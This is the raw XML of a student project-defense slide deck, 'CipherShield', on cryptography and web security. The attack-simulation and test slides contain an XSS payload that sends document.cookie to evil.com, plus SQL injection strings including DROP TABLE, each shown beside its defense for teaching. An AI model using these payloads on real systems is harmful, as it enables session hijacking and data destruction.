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548640"/>
            <a:ext cx="7132320" cy="566928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548640"/>
            <a:ext cx="713232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73152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A4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CSC 434 — PROJECT DEFENSE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10058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spc="200" kern="0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CipherShield</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="21031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Web Security &amp; Cryptography Lab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11480" y="2724912"/>
            <a:ext cx="3657600" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007A40"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="007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3464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Web Design and Data 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200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400-Level Computer Science  |  SIWES Industrial Project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35478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Full Name]  •  [Matric Number]  •  [University Name]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0233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Caesar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48840" y="40233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Vigenère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86200" y="40233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8620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XOR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23560" y="40233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Hashing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4805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480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OWASP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48840" y="44805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48840" y="4480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XSS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886200" y="44805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86200" y="4480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SQLi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23560" y="44805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4480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49377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9377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HTTPS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48840" y="49377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8840" y="49377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Headers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86200" y="4937760"/>
            <a:ext cx="164592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86200" y="49377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🔏 Passwords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89520" y="640080"/>
            <a:ext cx="2011680" cy="22860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589520" y="640080"/>
            <a:ext cx="201168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9601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758952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829800" y="640080"/>
            <a:ext cx="2011680" cy="22860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829800" y="64008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29800" y="9601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7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982980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Algos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589520" y="3154680"/>
            <a:ext cx="2011680" cy="22860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589520" y="3154680"/>
            <a:ext cx="2011680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3474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3355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OWASP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Text 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7589520" y="4663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829800" y="3154680"/>
            <a:ext cx="2011680" cy="22860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829800" y="3154680"/>
            <a:ext cx="201168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29800" y="34747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SHA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Text 66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9829800" y="4663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6675120"/>
            <a:ext cx="1188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| CSC 434: Web Design &amp; Data Security | 400-Level Computer Science | SIWES Portfolio Project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751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— CSC 434: Web Design &amp; Data Security  |  400-Level Computer Science  |  SIWES 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PRESENTATION STRUCTURE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Agenda &amp; Contents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" cy="9509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97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10972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149961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web security knowledge is critical in modern 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84832"/>
            <a:ext cx="54864" cy="9509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1762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9848" y="21762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9848" y="25786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CipherShield aims to demonstrate &amp; teach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63824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63824"/>
            <a:ext cx="54864" cy="9509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2552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69848" y="325526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Modules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36576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Caesar, Vigenère, XOR &amp; Hash Functions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242816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242816"/>
            <a:ext cx="54864" cy="950976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3342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355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69848" y="433425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— OWASP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69848" y="47365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most critical web vulnerabilities (2021)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5321808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5321808"/>
            <a:ext cx="54864" cy="95097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54132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69848" y="54132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Simulations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9848" y="581558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XSS &amp; SQL Injection demonstrations with defenses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1005840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1005840"/>
            <a:ext cx="54864" cy="950976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097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50608" y="10972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Sessions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50608" y="149961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JWT, MFA, session management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084832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2084832"/>
            <a:ext cx="54864" cy="9509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21762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150608" y="21762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&amp; Security Headers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50608" y="257860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handshake, certificate chains, HTTP headers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3163824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0" y="3163824"/>
            <a:ext cx="54864" cy="9509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32552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150608" y="325526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Design Concepts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50608" y="36576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design, CSS variables, JavaScript DOM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4242816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4242816"/>
            <a:ext cx="54864" cy="9509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43342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150608" y="433425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150608" y="47365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 attack scenarios, security audit results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0" y="5321808"/>
            <a:ext cx="5486400" cy="9509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00800" y="5321808"/>
            <a:ext cx="54864" cy="95097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65392" y="54132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150608" y="54132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150608" y="581558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impact, and enhancement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751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— CSC 434: Web Design &amp; Data Security  |  400-Level Computer Science  |  SIWES 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SLIDE 01 — BACKGROUND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5669280" cy="53949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5669280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3355"/>
                </a:solidFill>
              </a:rPr>
              <a:t>THE SECURITY CRISIS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35331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damages are projected to reach $10.5 trillion annually by 2025. Yet most CS graduates lack practical security knowledge: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920240"/>
            <a:ext cx="54864" cy="71323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Practical Exposure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theory but never see real attacks execute or how defenses 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724912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24912"/>
            <a:ext cx="54864" cy="71323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797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27980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Insecure-by-Default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 built without security in mind — vulnerable from day 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529584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529584"/>
            <a:ext cx="54864" cy="71323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844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36027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is Abstract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38953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XOR, Caesar, hash functions — taught as math, not as tools to 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334256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334256"/>
            <a:ext cx="54864" cy="71323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389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24128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Unknown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47000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graduates cannot name 5 of the Top 10 critical vulnerabilities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38928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5138928"/>
            <a:ext cx="54864" cy="71323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51937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24128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Auth Practices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4128" y="5504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passwords, no MFA, SQL-concatenated queries still common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969264"/>
            <a:ext cx="5669280" cy="53949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969264"/>
            <a:ext cx="566928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CIPHERSHIELD SOLVES THIS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00" y="1920240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1920240"/>
            <a:ext cx="54864" cy="7132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197510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Live Crypto Lab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0" y="2286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Encrypt/decrypt with Caesar, Vigenère, XOR — see bytes change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0" y="2724912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0" y="2724912"/>
            <a:ext cx="54864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277977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Real SHA-256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30906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Web Crypto API — compute SHA-256/512 in-browser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3529584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3529584"/>
            <a:ext cx="54864" cy="713232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35844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Attack Simulator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0" y="38953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and SQL injection demos with safe sandbox environment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0" y="4334256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00800" y="4334256"/>
            <a:ext cx="54864" cy="71323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43891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Defense Showcase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83680" y="47000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vulnerable vs. secure code for every attack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0" y="5138928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00800" y="5138928"/>
            <a:ext cx="54864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51937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OWASP Coverage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583680" y="55046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vulnerabilities with descriptions, examples, fixes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00800" y="5943600"/>
            <a:ext cx="5303520" cy="71323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400800" y="5943600"/>
            <a:ext cx="54864" cy="713232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59984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Secure Auth Demo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583680" y="6309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login with hashing, MFA, JWT, session concepts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751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— CSC 434: Web Design &amp; Data Security  |  400-Level Computer Science  |  SIWES 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SLIDE 03 — CRYPTOGRAPHY MODULES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Classical &amp; Modern Cryptography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3657600" cy="24231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36576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CAESAR CIPHER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Plaintext:  ATTACK AT DAWN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Shift:      +3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Ciphertext: DWWDFN DW GDZQ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C = (P + K) mod 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Decrypt: P = (C - K + 26) mod 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Brute-forceable in 25 tries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9144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7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ROT-13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08760" y="2788920"/>
            <a:ext cx="10972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788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BC origin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969264"/>
            <a:ext cx="3657600" cy="24231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969264"/>
            <a:ext cx="3657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115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FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>VIGENÈRE CIPHER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3484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WEAREDISCOVERED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 CRYPTO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 ZMMTCMIHCLZMIML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Cᵢ = (Pᵢ + Kᵢ) mod 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Dᵢ = (Cᵢ - Kᵢ + 26) mod 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years unbroken until Kasiski (1863)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2788920"/>
            <a:ext cx="12801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788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Polyalphabetic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83880" y="969264"/>
            <a:ext cx="3749040" cy="24231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83880" y="969264"/>
            <a:ext cx="3749040" cy="457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1115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9B59FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XOR ENCRYPTION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66760" y="13716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H(72) ⊕ K(75) = 03 hex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e(65) ⊕ E(69) = 04 hex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Self-inverse: (P⊕K)⊕K = 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One-Time Pad: unbreakable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B5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in: AES, ChaCha20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26883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AES symmetric encryption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11612880" cy="269748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57600"/>
            <a:ext cx="1161288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80390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D700"/>
                </a:solidFill>
              </a:rPr>
              <a:t># HASH FUNCTIONS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05993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CSC 434!" hashed with different algorithms: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407408"/>
            <a:ext cx="11247120" cy="4937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4407408"/>
            <a:ext cx="54864" cy="4937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531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MD5 ⚠️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45312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[32 hex]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697480" y="44531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d41d8cd98f00b204e9800998ecf8427e (simulated)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515600" y="44531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974336"/>
            <a:ext cx="11247120" cy="4937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2920" y="4974336"/>
            <a:ext cx="54864" cy="49377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02005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SHA-1 ⚠️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737360" y="502005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[40 hex]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97480" y="502005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da39a3ee5e6b4b0d3255bfef95601890afd80709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515600" y="502005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541264"/>
            <a:ext cx="11247120" cy="493776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5541264"/>
            <a:ext cx="54864" cy="4937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55869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 ✅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737360" y="55869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[64 hex]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697480" y="558698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315f5bdb76d078c43b8ac0064e4a0164612b1fce8fa4ce7da1ffec8fdcd... (truncated)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515600" y="558698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751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— CSC 434: Web Design &amp; Data Security  |  400-Level Computer Science  |  SIWES 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SLIDE 04 — WEB SECURITY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OWASP Top 10 — Critical Web Vulnerabilities (2021)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54864" cy="100584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1155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6152" y="109728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16152" y="1463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access unauthorized resources — most common vuln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1078992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0789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2093976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093976"/>
            <a:ext cx="54864" cy="100584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2037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6152" y="218541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16152" y="25511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Weak/missing encryption of passwords and sensitive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6360" y="2167128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1671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3182112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82112"/>
            <a:ext cx="54864" cy="100584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291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6152" y="327355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(SQL/XSS)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16152" y="36393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in interpreter — auth bypass, data theft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3255264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255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4270248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270248"/>
            <a:ext cx="54864" cy="10058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43799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16152" y="436168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16152" y="47274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security in architecture — no rate limiting, no threat model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4343400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4343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5358384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5358384"/>
            <a:ext cx="54864" cy="10058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5468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16152" y="544982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16152" y="58155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passwords, debug mode on, cloud storage public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66360" y="5431536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54315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263640" y="1005840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005840"/>
            <a:ext cx="54864" cy="10058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11155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59752" y="109728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Components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159752" y="1463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outdated libraries with known CVEs (e.g. Log4Shell)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109960" y="1078992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09960" y="10789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63640" y="2093976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63640" y="2093976"/>
            <a:ext cx="54864" cy="10058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22037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59752" y="218541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 Failures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159752" y="25511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passwords, exposed session tokens, no MFA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1109960" y="2167128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109960" y="21671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63640" y="3182112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63640" y="3182112"/>
            <a:ext cx="54864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8232" y="3291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A08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159752" y="327355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Failures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159752" y="36393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attacks, unsigned updates, deserialization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109960" y="3255264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109960" y="3255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263640" y="4270248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263640" y="4270248"/>
            <a:ext cx="54864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28232" y="43799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A09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159752" y="436168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 Failures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7159752" y="47274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breaches go undetected for months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1109960" y="4343400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109960" y="4343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263640" y="5358384"/>
            <a:ext cx="5486400" cy="100584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263640" y="5358384"/>
            <a:ext cx="54864" cy="100584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28232" y="5468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A10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159752" y="544982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7159752" y="58155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fetches URLs from user input → internal network exposure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1109960" y="5431536"/>
            <a:ext cx="54864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109960" y="54315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8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751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— CSC 434: Web Design &amp; Data Security  |  400-Level Computer Science  |  SIWES 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SLIDE 05 — ATTACK SIMULATIONS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XSS &amp; SQL Injection Attacks + Defenses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5623560" cy="53949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5623560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3355"/>
                </a:solidFill>
              </a:rPr>
              <a:t>💉 CROSS-SITE SCRIPTING (XSS)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353312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VULNERABLE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element.innerHTML = userInput;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Attacker submits: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&lt;script&gt;fetch("evil.com/steal?c="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+document.cookie)&lt;/script&gt;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Cookie stolen, session hijacked!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PROTECTED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element.textContent = userInput;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sanitize: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safe = DOMPurify.sanitize(input);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13308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D4D6A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XSS TYPES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4334256"/>
            <a:ext cx="5212080" cy="329184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4334256"/>
            <a:ext cx="54864" cy="329184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3708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19072" y="4370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 URL — one-time attack via malicious link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709160"/>
            <a:ext cx="5212080" cy="329184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4709160"/>
            <a:ext cx="54864" cy="329184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4745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19072" y="4745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in DB — executes for every visitor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5084064"/>
            <a:ext cx="5212080" cy="329184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5084064"/>
            <a:ext cx="54864" cy="32918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51206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DOM-based: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19072" y="5120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modifies DOM — no server involved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547725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PREVENTION: CSP HEADER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56692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Content-Security-Policy: default-src 'self'; script-src 'nonce-abc'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969264"/>
            <a:ext cx="5669280" cy="53949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969264"/>
            <a:ext cx="5669280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3355"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🗄 SQL INJECTION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55080" y="1353312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VULNERABLE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 = `SELECT * FROM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user='${u}'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pass='${p}'`;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Attacker: pass = ' OR '1'='1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Query: ...AND pass='' OR '1'='1'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1=1 is ALWAYS true → All rows!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 Bypassed — admin access!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364992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PARAMETERIZED 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 = `SELECT * FROM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user=? AND pass=?`;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db.query(q, [username, passHash]);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 never interpreted as SQL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449884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D4D6A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ATTACK PAYLOADS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55080" y="4681728"/>
            <a:ext cx="5303520" cy="29260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73952" y="4709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5029200"/>
            <a:ext cx="5303520" cy="29260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73952" y="50566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 DROP TABLE users;--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5376672"/>
            <a:ext cx="5303520" cy="29260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73952" y="540410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* FROM admin--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5724144"/>
            <a:ext cx="5303520" cy="29260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73952" y="575157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admin'--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751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— CSC 434: Web Design &amp; Data Security  |  400-Level Computer Science  |  SIWES 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SLIDE 06 — SECURITY PROTOCOLS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Authentication &amp; HTTPS / TLS Protocol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5623560" cy="53949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562356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8C00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🔐 SECURE AUTHENTICATION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D4D6A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SECURE LOGIN FLOW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1572768"/>
            <a:ext cx="521208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72768"/>
            <a:ext cx="54864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62763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1645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1920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inputs — block SQL injection, XSS patterns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304288"/>
            <a:ext cx="521208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304288"/>
            <a:ext cx="54864" cy="6400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35915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2377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2651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bcrypt.compare(input, storedHash) — timing-safe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035808"/>
            <a:ext cx="521208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035808"/>
            <a:ext cx="54864" cy="6400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09067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3108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7552" y="3383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after 5 failed attempts — prevent brute force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767328"/>
            <a:ext cx="521208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767328"/>
            <a:ext cx="54864" cy="64008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82219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7552" y="3840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Verification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4114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(Google Authenticator) or SMS code required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498848"/>
            <a:ext cx="521208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4498848"/>
            <a:ext cx="54864" cy="6400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5537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7552" y="4572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7552" y="4846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token with secret — expires in 24h, HttpOnly cookie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534009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D4D6A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>JWT STRUCTURE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552297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Header.Payload.Signature  |  {alg:"HS256"} + {user:"admin",exp:+24h}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969264"/>
            <a:ext cx="5669280" cy="539496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969264"/>
            <a:ext cx="56692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1155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FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🔒 HTTPS / TLS HANDSHAKE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55080" y="1572768"/>
            <a:ext cx="530352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1572768"/>
            <a:ext cx="54864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6276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ClientHello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37960" y="19202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supported TLS versions, cipher suites, random bytes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2304288"/>
            <a:ext cx="530352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55080" y="2304288"/>
            <a:ext cx="54864" cy="6400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35915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ServerHello + Cert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37960" y="2651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picks cipher, sends X.509 certificate (RSA/ECDSA)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3035808"/>
            <a:ext cx="530352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55080" y="3035808"/>
            <a:ext cx="54864" cy="6400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0906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Certificate Verify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37960" y="33832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verifies cert against trusted CA (browser trust store)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55080" y="3767328"/>
            <a:ext cx="530352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55080" y="3767328"/>
            <a:ext cx="54864" cy="64008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38221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Key Exchange (DH)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37960" y="41148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ECDHE: both parties compute same session key independently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55080" y="4498848"/>
            <a:ext cx="5303520" cy="64008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355080" y="4498848"/>
            <a:ext cx="54864" cy="6400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45537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Finished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37960" y="48463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"Finished" messages confirm channel is secure ✓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355080" y="5340096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D4D6A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TLS 1.3 CIPHER SUITES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355080" y="552297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TLS_AES_256_GCM_SHA384  |  TLS_CHACHA20_POLY1305_SHA256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751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— CSC 434: Web Design &amp; Data Security  |  400-Level Computer Science  |  SIWES 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SLIDE 08 — WEB DESIGN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Web Design Concepts &amp; Implementation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3657600" cy="171907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36576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207008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2070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12344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&amp; Dark Theme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0299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CSS custom properties for consistent color theming. Scan-line overlay creates authentic terminal aesthetic.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1005840"/>
            <a:ext cx="3657600" cy="171907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005840"/>
            <a:ext cx="3657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6552" y="1207008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12070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57800" y="12344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&amp; Flexbox Layout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6552" y="20299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sidebar + main layout. 2, 3, 4-column grids adapt to content. Mobile-first breakpoints.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3657600" cy="171907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3657600" cy="457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3081528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0815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325880" y="31089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 Interactivity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3904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live modules, all pure vanilla JS. Real Web Crypto API for SHA-256/512. Async/await for hashing.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51960" y="2880360"/>
            <a:ext cx="3657600" cy="171907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2880360"/>
            <a:ext cx="3657600" cy="4572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16552" y="3081528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6552" y="30815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🔠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257800" y="31089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Typography System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16552" y="3904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Rajdhani for headers (Rajdhani, letter-spacing). Share Tech Mono for code. Outfit for body text.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754880"/>
            <a:ext cx="3657600" cy="171907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754880"/>
            <a:ext cx="36576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4956048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49560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325880" y="49834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Structure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" y="57790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use of &lt;nav&gt;, &lt;main&gt;, &lt;section&gt;. ARIA labels. Keyboard navigation. Screen reader friendly.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51960" y="4754880"/>
            <a:ext cx="3657600" cy="1719072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51960" y="4754880"/>
            <a:ext cx="3657600" cy="45720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3355"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="FF33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6552" y="4956048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16552" y="49560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257800" y="498348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 &amp; Events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16552" y="57790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generation, conditional rendering, event delegation. All UI built programmatically.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0" y="1005840"/>
            <a:ext cx="3657600" cy="557784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0" y="1005840"/>
            <a:ext cx="36576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11521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SECURITY-FIRST CSS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412480" y="13716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--bg:     #03050A;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--green:  #00FF88;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--red:    #FF3355;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--border: #1A3050;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Scan-line overlay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body::after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repeating-linear-gradient(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0deg, transparent 0px,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rgba(0,255,136,.012) 2px,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transparent 4px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pointer-events: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inline styles for user data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element.textContent = userInput;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↑ Prevents XSS automatically */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49743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2D4D6A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>KEY DESIGN DECISIONS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412480" y="5175504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50224" y="51755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CSS frameworks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412480" y="5495544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50224" y="54955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security demos sandboxed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12480" y="5815584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50224" y="58155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CSP-compliant — no eval()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12480" y="6135624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50224" y="613562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66751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— CSC 434: Web Design &amp; Data Security  |  400-Level Computer Science  |  SIWES Portfolio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SLIDE 09 — VALIDATION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Security Testing &amp; Validation Results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2651760" cy="96012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9264"/>
            <a:ext cx="265176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159105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Tested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969264"/>
            <a:ext cx="2651760" cy="96012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9264"/>
            <a:ext cx="26517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46120" y="159105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969264"/>
            <a:ext cx="2651760" cy="96012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69264"/>
            <a:ext cx="265176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159105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98280" y="969264"/>
            <a:ext cx="2651760" cy="96012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969264"/>
            <a:ext cx="265176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0972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098280" y="159105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Grade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066544"/>
            <a:ext cx="11567160" cy="4297680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066544"/>
            <a:ext cx="11567160" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1A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08483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45920" y="20848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0" y="208483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208483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58400" y="208483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D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450592"/>
            <a:ext cx="11567160" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0912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496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45920" y="24963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Caesar Encrypt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24963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+ shift=3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0" y="24963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DWWDFN ✓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58400" y="24963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28163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45920" y="28163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Caesar Decrypt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0" y="28163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DWWDFN + shift=3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28163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✓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058400" y="28163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090672"/>
            <a:ext cx="11567160" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0912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136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645920" y="31363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 Hash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114800" y="31363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CSC 434!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58000" y="3136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64-hex string generated ✓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058400" y="313639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3456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645920" y="34564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Avalanche Effect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114800" y="34564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1 char in hash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858000" y="34564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Completely different hash ✓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058400" y="34564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3730752"/>
            <a:ext cx="11567160" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0912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7764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645920" y="37764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XSS Safe Render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4800" y="37764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&lt;script&gt;alert(1)&lt;/script&gt;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58000" y="37764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Sanitized — not executed ✓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058400" y="37764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40965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645920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XSS innerHTML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114800" y="40965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onerror=alert(1)&gt;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858000" y="40965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shown, sandbox safe ✓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058400" y="40965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0040" y="4370832"/>
            <a:ext cx="11567160" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0912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44165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645920" y="44165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Bypass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114800" y="44165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= ' OR '1'='1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858000" y="44165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bypass detected &amp; shown ✓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0058400" y="44165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47365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TC-08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645920" y="47365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114800" y="47365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users;--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858000" y="47365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Catastrophic impact shown ✓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0058400" y="473659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0040" y="5010912"/>
            <a:ext cx="11567160" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0912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5056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TC-09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645920" y="5056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 Wrong pwd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114800" y="50566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/ wrongpass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858000" y="50566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rejected ✓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0058400" y="50566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57200" y="5376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645920" y="53766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 MFA fail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114800" y="53766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 pwd + 000000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858000" y="53766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MFA block triggered ✓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10058400" y="53766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20040" y="5650992"/>
            <a:ext cx="11567160" cy="301752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0912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56967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TC-11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645920" y="56967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Strength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4114800" y="56967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P@ssw0rd!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6858000" y="56967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computed correctly ✓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058400" y="56967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57200" y="6016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TC-12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645920" y="60167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Headers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4114800" y="60167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 profile load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858000" y="60167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A+ — all 7 headers ✓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10058400" y="601675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004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74320"/>
            <a:ext cx="5943600" cy="6291072"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060C14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74320"/>
            <a:ext cx="59436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572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SLIDE 10 — WRAP UP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65836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11480" y="128016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FF88"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WHAT WAS DELIVERED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1517904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151790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Caesar, Vigenère &amp; XOR cipher tools with live I/O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1947672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19476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SHA-256 &amp; SHA-512 via Web Crypto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2377440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23774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attack simulator with safe/unsafe render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2807208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28072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demo with all attack payloads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3236976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23697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OWASP Top 10 reference table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3666744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36667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bcrypt concept, MFA, JWT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096512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0965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 walkthrough (5 steps)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" y="4526280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5262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scanner with grading (A+ → F)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4956048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95604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analyzer + crack time estimate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5385816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538581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dark UI with scan-line aesthetics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1480" y="5815584"/>
            <a:ext cx="164592" cy="16459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58155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 — pure vanilla web stack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274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D4FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FUTURE ENHANCEMENTS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00800" y="475488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" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E8F4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53" name="Shape 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1097280"/>
            <a:ext cx="5486400" cy="9144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00800" y="1097280"/>
            <a:ext cx="54864" cy="9144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65392" y="115214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565392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symmetric block cipher implementation with mode selection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00800" y="2121408"/>
            <a:ext cx="5486400" cy="9144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00800" y="2121408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65392" y="21762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Key Generation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565392" y="24871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public/private key pair demo with encryption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00800" y="3145536"/>
            <a:ext cx="5486400" cy="9144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00800" y="3145536"/>
            <a:ext cx="54864" cy="9144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65392" y="32004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Simulator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565392" y="35112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 rule engine for request filtering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400800" y="4169664"/>
            <a:ext cx="5486400" cy="9144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00800" y="4169664"/>
            <a:ext cx="54864" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="9B59FF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="9B59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65392" y="42245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 Demo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565392" y="45354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request forgery and token-based prevention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400800" y="5193792"/>
            <a:ext cx="5486400" cy="914400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400800" y="5193792"/>
            <a:ext cx="54864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65392" y="524865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Scanner Tool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565392" y="5559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network scanning tool for penetration testing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400800" y="6199632"/>
            <a:ext cx="5486400" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="091220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400800" y="6199632"/>
            <a:ext cx="548640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619963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Thank You — 🛡️ Questions Welcome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C14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="060C1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82880" y="6675120"/>
            <a:ext cx="1188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D4D6A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CipherShield | CSC 434: Web Design &amp; Data Security | 400-Level Computer Science | SIWES Portfolio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2026-03-23T11:56:39Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-23T11:56:39Z</dcterms:modified>
</cp:coreProperties>
</file>